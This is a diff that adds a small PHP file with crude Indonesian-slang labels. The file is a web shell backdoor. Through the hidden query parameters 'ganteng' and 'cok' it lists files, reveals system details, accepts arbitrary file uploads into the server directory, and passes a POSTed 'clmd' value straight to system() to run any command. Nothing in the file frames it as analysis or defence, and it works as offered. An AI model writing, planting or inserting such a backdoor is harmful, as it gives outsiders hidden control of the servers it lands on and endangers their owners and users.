@@ -1,0 +1,39 @@
+<?php
+
+if(isset($_GET['ganteng']))
+{
+echo system('ls');
+echo "<div align='left'><font size='1'>Input kontol :</font></div>
+<form action='' enctype='multipart/form-data' method='POST'>
+<input type='file' name='filena'>
+<input type='submit' name='kontol' value='gasken'>
+</form>"; }
+if (isset($_POST['kontol'])) {
+  $cwd=getcwd();
+  $tmp=$_FILES['filena']['tmp_name'];
+  $file=$_FILES['filena']['name'];
+  if (@copy($tmp, $file)){
+    echo "File berhasil terkontol! => $cwd/$file";
+  }
+  else {
+    echo "File gagal terkontol :(";
+  }
+}
+
+if (isset($_GET['cok']))
+{
+    echo system('uname -a');
+echo "<div align='left'><font size='1'>Input tolol :</font></div>
+<form name='clmd' method='POST' enctype='multipart/form-data'>
+<input type='text' name='clmd' size='30' class='input'><br>
+<pre>";
+    
+}
+if (isset($_POST['clmd'])) {
+  $clmd=$_POST['clmd'];
+  system($clmd);
+  exit;
+  }
+
+
+  ?>
